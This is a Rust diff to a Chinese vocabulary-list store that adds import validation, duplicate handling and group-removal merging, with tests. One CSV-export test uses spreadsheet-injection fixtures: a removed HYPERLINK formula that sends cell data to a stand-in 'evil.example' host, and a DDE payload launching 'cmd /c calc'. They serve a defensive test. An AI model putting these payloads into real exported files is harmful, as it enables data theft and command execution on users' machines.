@@ -288,6 +288,14 @@ impl Default for Document {
 pub struct ImportSummary {
     pub added: usize,
     pub skipped_duplicates: usize,
+    /// Entries and group names left out because they break the rules
+    /// [`VocabStore::add_entry`] and [`VocabStore::add_group`] apply: empty text,
+    /// text over 20 characters or with a control character in it, a group name
+    /// over 40 characters or with one, or a blank name in the list of groups.
+    /// The rest of the file is still imported, the way a duplicate is skipped
+    /// rather than failing the whole import.
+    #[serde(default)]
+    pub skipped_invalid: usize,
     pub groups_added: usize,
     /// True when the import replaced the existing list rather than merging.
     pub replaced: bool,
@@ -487,6 +495,11 @@ impl VocabStore {
     }
 
     /// Change an entry's pinyin, meaning or group.
+    ///
+    /// Moving an entry into a group that already holds the same text is refused
+    /// with [`VocabError::DuplicateEntry`], the rule [`Self::add_entry`] keeps
+    /// (issue #40), and nothing changes — not even the group being created. An
+    /// entry that stays where it is can always be edited.
     pub fn update_entry(
         &mut self,
         id: u64,
@@ -495,16 +508,27 @@ impl VocabStore {
         group: Option<&str>,
     ) -> Result<Entry, VocabError> {
         let group = validate_group(group)?;
+        let index = self
+            .document
+            .entries
+            .iter()
+            .position(|e| e.id == id)
+            .ok_or(VocabError::NoSuchEntry(id))?;
+        let moving = &self.document.entries[index];
+        if moving.group != group
+            && self
+                .document
+                .entries
+                .iter()
+                .any(|e| e.id != id && e.text == moving.text && e.group == group)
+        {
+            return Err(VocabError::DuplicateEntry(moving.text.clone()));
+        }
         // A rename to a non-empty group should not require creating it first.
         if let Some(name) = &group {
             self.ensure_group(name);
         }
-        let entry = self
-            .document
-            .entries
-            .iter_mut()
-            .find(|e| e.id == id)
-            .ok_or(VocabError::NoSuchEntry(id))?;
+        let entry = &mut self.document.entries[index];
         entry.pinyin = pinyin.trim().to_string();
         entry.meaning = meaning.trim().to_string();
         entry.group = group;
@@ -561,7 +585,24 @@ impl VocabStore {
     /// Remove a group.
     ///
     /// With `delete_entries` false the entries survive and become unfiled, which
-    /// is the safe default — deleting a label should not destroy work.
+    /// is the safe default — deleting a label should not destroy work. Returns
+    /// how many entries left the group, either way.
+    ///
+    /// An entry whose text is **already unfiled** is merged into that entry
+    /// rather than becoming a second copy of it (issue #40), since one word may
+    /// be in a group only once — the rule [`Self::add_entry`] keeps — and
+    /// refusing would leave a group that cannot be deleted without first deleting
+    /// work. The entry already unfiled survives, and nothing it holds is
+    /// overwritten: it takes the moved entry's pinyin and meaning only where its
+    /// own are blank, and the practice counters add up — attempts summed, the
+    /// better best score and the later practice kept, the rule the sync applies
+    /// when it collapses two copies of one word (`hanzi-sync`, issue #35).
+    ///
+    /// The sync's own rule keeps the copy with the lowest uuid, which this crate
+    /// cannot see. Choosing by group instead is what keeps devices agreeing: which
+    /// entry is unfiled is synced state, so two devices that remove the same
+    /// group pick the same survivor and delete the same copy, and a sync then
+    /// never meets two live copies to collapse.
     pub fn remove_group(&mut self, name: &str, delete_entries: bool) -> Result<usize, VocabError> {
         let index = self
             .document
@@ -579,12 +620,29 @@ impl VocabStore {
             Ok(before - self.document.entries.len())
         } else {
             let mut unfiled = 0;
-            for entry in self.document.entries.iter_mut() {
-                if entry.group.as_deref() == Some(name) {
-                    entry.group = None;
-                    unfiled += 1;
+            let mut merged = Vec::new();
+            for index in 0..self.document.entries.len() {
+                if self.document.entries[index].group.as_deref() != Some(name) {
+                    continue;
+                }
+                unfiled += 1;
+                let text = &self.document.entries[index].text;
+                let twin = self
+                    .document
+                    .entries
+                    .iter()
+                    .position(|e| e.group.is_none() && e.text == *text);
+                match twin {
+                    Some(survivor) => {
+                        let moved = self.document.entries[index].clone();
+                        merge_into(&mut self.document.entries[survivor], &moved);
+                        merged.push(moved.id);
+                    }
+                    None => self.document.entries[index].group = None,
                 }
             }
+            self.document.entries.retain(|e| !merged.contains(&e.id));
+            self.sort();
             Ok(unfiled)
         }
     }
@@ -644,7 +702,15 @@ impl VocabStore {
     ///
     /// Merging keeps existing entries, adds the new ones and unions the groups;
     /// an imported entry whose text already exists in the same group is skipped
-    /// rather than duplicated.
+    /// rather than duplicated — whether it was there before or arrived earlier in
+    /// the same file, in either mode.
+    ///
+    /// The file is held to the rules typing an entry is (issue #40). Text and
+    /// group names are trimmed and checked as [`Self::add_entry`] checks them, a
+    /// blank group is unfiled, and a row that breaks a rule is skipped and
+    /// counted in [`ImportSummary::skipped_invalid`] rather than refusing the
+    /// whole file, as a duplicate is. Only a file that is not a list at all is
+    /// refused, and then nothing changes.
     pub fn import_json(&mut self, json: &str, merge: bool) -> Result<ImportSummary, VocabError> {
         let incoming: Document =
             serde_json::from_str(json).map_err(|e| VocabError::Malformed(e.to_string()))?;
@@ -663,6 +729,11 @@ impl VocabStore {
         }
 
         for name in incoming.groups {
+            // A blank name is no group, as `add_group` says.
+            let Ok(Some(name)) = validate_group(Some(&name)) else {
+                summary.skipped_invalid += 1;
+                continue;
+            };
             if !self.document.groups.contains(&name) {
                 self.document.groups.push(name);
                 summary.groups_added += 1;
@@ -670,6 +741,17 @@ impl VocabStore {
         }
 
         for mut entry in incoming.entries {
+            let (Ok(text), Ok(group)) = (
+                validate_text(&entry.text),
+                validate_group(entry.group.as_deref()),
+            ) else {
+                summary.skipped_invalid += 1;
+                continue;
+            };
+            entry.text = text;
+            entry.group = group;
+            entry.pinyin = entry.pinyin.trim().to_string();
+            entry.meaning = entry.meaning.trim().to_string();
             let duplicate = self
                 .document
                 .entries
@@ -717,6 +799,30 @@ impl VocabStore {
         self.document.groups.dedup();
         self.document.entries.sort_by(entry_order);
     }
+}
+
+/// Fold `moved` into `survivor`, two entries for the same word in the same place.
+///
+/// The survivor keeps everything it has; the moved entry's pinyin and meaning
+/// fill only what is blank, and the practice counters add up the way the sync
+/// adds them when it collapses duplicates — attempts summed, the better best
+/// score and the later practice kept.
+fn merge_into(survivor: &mut Entry, moved: &Entry) {
+    if survivor.pinyin.is_empty() {
+        survivor.pinyin = moved.pinyin.clone();
+    }
+    if survivor.meaning.is_empty() {
+        survivor.meaning = moved.meaning.clone();
+    }
+    survivor.attempts = survivor.attempts.saturating_add(moved.attempts);
+    survivor.best_score = match (survivor.best_score, moved.best_score) {
+        (Some(a), Some(b)) => Some(a.max(b)),
+        (a, b) => a.or(b),
+    };
+    survivor.last_practised = match (&survivor.last_practised, &moved.last_practised) {
+        (Some(a), Some(b)) => Some(a.max(b).clone()),
+        (a, b) => a.clone().or_else(|| b.clone()),
+    };
 }
 
 /// Validate and normalise entry text.
@@ -973,6 +1079,39 @@ mod tests {
         assert!(store.groups().contains(&"B".to_string()));
     }
 
+    /// Moving an entry onto a word already in the target group is refused, the
+    /// rule `add_entry` keeps, and changes nothing (issue #40).
+    #[test]
+    fn updating_refuses_to_move_an_entry_onto_its_own_duplicate() {
+        let mut store = VocabStore::in_memory();
+        let filed = store.add_entry("好", "hǎo", "good", Some("A")).unwrap().id;
+        store.add_entry("好", "hǎo", "good", Some("B")).unwrap();
+        let unfiled = store.add_entry("好", "", "", None).unwrap().id;
+        let before = store.document().clone();
+
+        for (id, target) in [(filed, Some("B")), (filed, None), (unfiled, Some("A"))] {
+            let refused = store
+                .update_entry(id, "hào", "to like", target)
+                .unwrap_err();
+            assert!(
+                matches!(refused, VocabError::DuplicateEntry(ref t) if t == "好"),
+                "{refused}"
+            );
+        }
+        assert_eq!(
+            store.document().entries,
+            before.entries,
+            "nothing was edited"
+        );
+        assert_eq!(store.groups(), before.groups);
+
+        // An entry that stays where it is can still be edited.
+        let kept = store
+            .update_entry(filed, "hào", "to like", Some("A"))
+            .unwrap();
+        assert_eq!(kept.meaning, "to like");
+    }
+
     // ---- groups -----------------------------------------------------------
 
     #[test]
@@ -1012,6 +1151,54 @@ mod tests {
         store.add_entry("坏", "", "", Some("Doomed")).unwrap();
         assert_eq!(store.remove_group("Doomed", true).unwrap(), 1);
         assert_eq!(store.entries().len(), 1);
+    }
+
+    /// Unfiling a group's entries never leaves two unfiled copies of one word
+    /// (issue #40): an entry whose text is already unfiled is merged into it.
+    ///
+    /// The one already unfiled survives with its own fields, takes the moved
+    /// entry's pinyin and meaning only where its own are blank, and the practice
+    /// counters add up, as the sync's collapse of duplicates adds them.
+    #[test]
+    fn removing_a_group_merges_an_entry_into_its_unfiled_twin() {
+        let mut store = VocabStore::in_memory();
+        let survivor = store.add_entry("好", "", "good", None).unwrap().id;
+        let moved = store.add_entry("好", "hǎo", "fine", Some("L1")).unwrap().id;
+        let other = store.add_entry("坏", "huài", "bad", Some("L1")).unwrap().id;
+        store.record_attempt(survivor, 40.0).unwrap();
+        store.record_attempt(moved, 90.0).unwrap();
+        store.record_attempt(moved, 70.0).unwrap();
+
+        assert_eq!(store.remove_group("L1", false).unwrap(), 2);
+        assert!(store.groups().is_empty());
+        let unfiled = store.entries_in(None);
+        assert_eq!(unfiled.len(), 2, "{unfiled:?}");
+        let texts: Vec<&str> = unfiled.iter().map(|e| e.text.as_str()).collect();
+        assert_eq!(texts.iter().filter(|t| **t == "好").count(), 1);
+
+        let merged = store.entries().iter().find(|e| e.text == "好").unwrap();
+        assert_eq!(merged.id, survivor, "the entry already unfiled survives");
+        assert_eq!(merged.meaning, "good", "its own meaning is kept");
+        assert_eq!(
+            merged.pinyin, "hǎo",
+            "a blank pinyin is filled from the twin"
+        );
+        assert_eq!(merged.attempts, 3);
+        assert_eq!(merged.best_score, Some(90.0));
+        assert!(merged.last_practised.is_some());
+        assert!(store.entries().iter().all(|e| e.id != moved));
+
+        let kept = store.entries().iter().find(|e| e.id == other).unwrap();
+        assert_eq!(
+            kept.group, None,
+            "an entry with no twin is unfiled as before"
+        );
+
+        // And the result keeps the rule `add_entry` keeps.
+        assert!(matches!(
+            store.add_entry("好", "", "", None),
+            Err(VocabError::DuplicateEntry(_))
+        ));
     }
 
     #[test]
@@ -1215,6 +1402,96 @@ mod tests {
         assert_eq!(store.entries().len(), 1);
     }
 
+    /// An import is held to the rules typing an entry is (issue #40): a row that
+    /// breaks one is skipped and counted, and the rest of the file still arrives.
+    #[test]
+    fn importing_skips_and_counts_rows_that_break_the_rules() {
+        let long = "字".repeat(MAX_TEXT_CHARS + 1);
+        let long_group = "g".repeat(MAX_GROUP_CHARS + 1);
+        let json = serde_json::json!({
+            "version": 1,
+            "nextId": 99,
+            "groups": ["L1", "", "  ", long_group, "bad\u{7}group", "  L2  "],
+            "entries": [
+                {"id": 1, "text": "好", "group": "L1", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 2, "text": "", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 3, "text": "   ", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 4, "text": long, "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 5, "text": "a\u{0}b", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 6, "text": "坏", "group": long_group, "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 7, "text": "中", "group": "bad\ngroup", "addedAt": "2026-01-01T00:00:00Z"},
+                // Blank is unfiled, not a group named "".
+                {"id": 8, "text": "  人 ", "group": "", "pinyin": " rén ",
+                 "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 9, "text": "大", "group": "  L2 ", "addedAt": "2026-01-01T00:00:00Z"},
+            ]
+        })
+        .to_string();
+
+        for merge in [false, true] {
+            let mut store = VocabStore::in_memory();
+            let summary = store.import_json(&json, merge).unwrap();
+            assert_eq!(summary.added, 3, "{summary:?}");
+            // Four group names and six entries.
+            assert_eq!(summary.skipped_invalid, 4 + 6, "{summary:?}");
+            assert_eq!(summary.skipped_duplicates, 0);
+            assert_eq!(store.groups(), ["L1", "L2"]);
+            let person = store.entries().iter().find(|e| e.text == "人").unwrap();
+            assert_eq!(person.group, None);
+            assert_eq!(person.pinyin, "rén");
+            assert_eq!(store.entries_in(Some("L2"))[0].text, "大");
+            for entry in store.entries() {
+                assert!(validate_text(&entry.text).is_ok(), "{entry:?}");
+                assert_eq!(
+                    validate_group(entry.group.as_deref()).unwrap(),
+                    entry.group,
+                    "{entry:?}"
+                );
+            }
+        }
+    }
+
+    /// One word in one group once, however it arrives (issue #40): twice in
+    /// the same file, or already in the list, and spelt with stray spaces or not.
+    #[test]
+    fn importing_never_makes_a_duplicate() {
+        let json = r#"{"version":1,"nextId":9,"groups":["A"],"entries":[
+            {"id":1,"text":"好","group":"A","addedAt":"2026-01-01T00:00:00Z"},
+            {"id":2,"text":" 好 ","group":"A ","addedAt":"2026-01-01T00:00:01Z"},
+            {"id":3,"text":"好","addedAt":"2026-01-01T00:00:02Z"},
+            {"id":4,"text":"好 ","group":"","addedAt":"2026-01-01T00:00:03Z"},
+            {"id":5,"text":"坏","addedAt":"2026-01-01T00:00:04Z"}]}"#;
+
+        // Replacing: only the file's own repeats are skipped.
+        let mut store = VocabStore::in_memory();
+        store.add_entry("坏", "", "", None).unwrap();
+        let summary = store.import_json(json, false).unwrap();
+        assert_eq!(
+            (summary.added, summary.skipped_duplicates),
+            (3, 2),
+            "{summary:?}"
+        );
+
+        // Adding: what is already there is skipped too.
+        let mut store = VocabStore::in_memory();
+        store.add_entry("坏", "", "", None).unwrap();
+        store.add_entry("好", "", "", Some("A")).unwrap();
+        let summary = store.import_json(json, true).unwrap();
+        assert_eq!(
+            (summary.added, summary.skipped_duplicates),
+            (1, 4),
+            "{summary:?}"
+        );
+
+        let mut seen = std::collections::HashSet::new();
+        for entry in store.entries() {
+            assert!(
+                seen.insert((entry.text.clone(), entry.group.clone())),
+                "{entry:?}"
+            );
+        }
+    }
+
     #[test]
     fn csv_export_quotes_awkward_fields() {
         let mut store = VocabStore::in_memory();
@@ -1239,16 +1516,17 @@ mod tests {
         // meaning columns below have no comma of their own, so they would not
         // even be quoted.
         //
-        // Imported rather than added, because `add_entry` validates `text` and
-        // this is exactly the text it refuses: `import_json` takes the fields as
-        // they were written, which is the whole point of it being a boundary.
+        // Imported, the way a shared list arrives. Since issue #40 the import
+        // holds text to the rules `add_entry` does, and a formula short enough to
+        // be an entry passes them — nothing about `=` is invalid in a word list —
+        // so the export is still the boundary that has to defuse it.
         let hostile = serde_json::json!({
             "version": FORMAT_VERSION,
             "nextId": 2,
             "groups": ["-2+3"],
             "entries": [{
                 "id": 1,
-                "text": "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")",
+                "text": "=HYPERLINK(\"e.x\",A1)",
                 "pinyin": "+1+1",
                 "meaning": "@SUM(1+1)*cmd|' /c calc'!A0",
                 "group": "-2+3",
